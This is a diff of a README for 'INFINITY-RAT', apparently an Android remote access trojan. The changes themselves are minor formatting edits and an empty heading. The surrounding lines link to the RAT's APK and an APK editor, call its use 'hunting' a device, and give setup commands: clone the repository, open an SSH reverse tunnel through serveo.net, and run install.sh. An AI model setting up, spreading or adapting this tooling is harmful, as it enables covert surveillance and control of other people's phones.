@@ -6,6 +6,9 @@
 - 𝙸𝙽𝙵𝙸𝙽𝙸𝚃𝚈 𝚁𝙰𝚃 [➱](https://github.com/infinitynetwork13/INFINITY-RAT/raw/main/APP/INFINITY_RAT.apk)
 - 𝙰𝙿𝙺 𝙴𝙳𝙸𝚃𝙾𝚁[➱](https://github.com/infinitynetwork13/INFINITY-RAT/raw/main/APP/APK_Editor.apk)
 - 𝚃𝙴𝚁𝙼𝚄𝚇[➱](https://f-droid.org/repo/com.termux_118.apk)
+
+## 𝐄𝐛𝐢𝐭 𝐀𝐩𝐩𝐥𝐢𝐜𝐚𝐭𝐢𝐨𝐧
+
 ## 𝗧𝗲𝗿𝗺𝘀 𝗼𝗳 𝗨𝘀𝗲
 
 ʏᴏᴜʀ ʜᴜɴᴛɪɴɢ ᴅᴇᴠɪᴄᴇ ᴡɪᴛʜ ᴛʜɪs ᴀᴘᴘ
@@ -58,13 +61,13 @@ pip install requests
 git clone https://github.com/infinitynetwork13/INFINITY-RAT.git
 ```
 - SSH
-```
+```bash
 ssh -R 80:localhost:9999 serveo.net
 ```
 `(yes/no/fingerprint) yes`
 `CTRL + c`
 ## Past Time Run
-```
+```bash
 cd INFINITY-RAT
 bash install.sh
 ```
